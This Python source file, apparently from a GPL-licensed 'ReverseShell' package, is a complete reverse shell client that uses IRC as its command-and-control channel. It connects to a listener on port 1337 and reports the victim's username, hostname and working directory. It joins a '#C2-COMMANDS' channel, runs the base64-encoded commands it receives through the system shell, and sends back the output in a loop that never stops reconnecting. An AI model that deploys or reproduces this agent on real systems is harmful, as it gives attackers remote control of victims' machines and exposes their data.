#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from os import getcwd
from platform import node
from socket import socket
from getpass import getuser
from contextlib import suppress
from subprocess import run, PIPE
from base64 import b64decode, b64encode


def sendall(data):
    chunk = data[:30000]
    data = data[30000:]
    while chunk:
        s.sendall(chunk)
        chunk = data[:30000]
        data = data[30000:]


while True:
    with suppress(Exception):
        s = socket()
        s.connect(("127.0.0.1", 1337))
        sendall(
            b"USER "
            + getuser().encode()
            + b" "
            + node().encode()
            + b" localhost :"
            + getcwd().encode()
            + b"\r\n"
        )
        s.recv(65535)
        sendall(b"NICK " + getuser().encode() + b"\r\n")
        s.recv(65535)
        sendall(b"JOIN #C2-COMMANDS" + b"\r\n")
        ping = s.recv(65535)
        while not ping.startswith(b"PING :"):
            ping = s.recv(65535)
        sendall(b"PONG :" + ping[6:])
        s.recv(65535)
        data = b" "
        while True:
            sendall(b"PRIVMSG #C2-COMMANDS :" + b64encode(data) + b"\r\n")
            command = b64decode(
                s.recv(65535).split(maxsplit=3)[3][1:]
            ).decode()
            p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
            data = p.stdout or p.stderr or b" "
        s.close()
